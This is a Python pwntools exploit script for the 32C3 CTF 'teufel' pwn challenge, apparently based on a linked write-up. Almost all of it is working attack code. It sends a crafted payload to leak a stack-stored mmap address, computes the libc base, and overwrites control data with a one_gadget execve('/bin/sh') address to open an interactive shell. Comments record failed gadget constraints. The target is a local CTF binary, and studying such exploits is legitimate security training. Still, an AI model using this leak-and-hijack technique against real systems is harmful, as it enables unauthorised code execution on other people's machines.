# -*- coding: utf-8 -*-

# http://v0ids3curity.blogspot.kr/2015/12/32c3-ctf-pwn-200-teufel.html?m=0

import sys
from pwn import *

def hexify(x):
    return ":".join("{:02x}".format(ord(c)) for c in x)

b = ELF('teufel')

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

context.arch = 'amd64'
context.log_level = 'info'

#r = remote('localhost', 8888)
r = process('./teufel')
gdb.attach(r, '''
b *0x400532
'''
)
#raw_input('Go!')

# strace: 
#
# mmap(NULL, 12288, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0) = 0x7fe593523000
# mprotect(0x7fe593524000, 4096, PROT_READ|PROT_WRITE) = 0

#    log.info('pop rsi: %#x' % libc.search(asm('pop rsi; ret')).next())
#    log.info('pop rdi: %#x' % libc.search(asm('pop rdi; ret')).next())
#    log.info('pop rdx: %#x' % libc.search(asm('pop rdx; ret')).next())
#    log.info('/bin/sh: %#x' % libc.search('/bin/sh').next())

if __name__ == "__main__":

    payload = ""
    payload += p64(9)
    payload += p64(0xcafebabedeadbeef) 
    payload += "A" # overwrite NULL (unless puts() would terminate before the stored rbp)

    r.send(payload)
    resp = r.recv()

# start() stores the address of mmapped region at rbp (in fact, plus 0x2000)
# sub_4004E6() pushes rbp into the stack
# so we can leak the address with puts()
#
# cafebabe deadbeef + 'A' + addr + '\n'
# ef:be:ad:de:be:ba:fe:ca: 41: a0:ad:0f:93:7f: 0a

# leak rbp 

    mmap = resp[9:14]
    mmap = "\x00" + mmap + "\x00\x00"
    mmap = u64(mmap)

    mmap -= 0x2000

    log.info('mapped memory: %#x' % mmap)

# 0x5ea000 is from leak.py 

    LIBC_BASE = mmap - 0x5ea000
    log.info('LIBC_BASE: %#x' % LIBC_BASE)

# ONE_GADGET approach failed! couldn't overcome the constraints.
#
# 0x4526a execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL -> can't access! (mmap'ed to PROTO 0 region)
#
# 0xf66c0 execve("/bin/sh", rcx, [rbp-0xf8])
# constraints:
#   [rcx] == NULL || rcx == NULL  -> can't set rcx to 0!
#   [[rbp-0xf8]] == NULL || [rbp-0xf8] == NULL
 
    ONE_GADGET = LIBC_BASE + 0xf66c0
    log.info('ONE_GADGET: %#x' % ONE_GADGET)

    payload = ""
    payload += p64(24)
    payload += p64(0xcafebabe)
    payload += p64(mmap+0x1500)
    payload += p64(ONE_GADGET)
    r.send(payload)

    r.interactive()
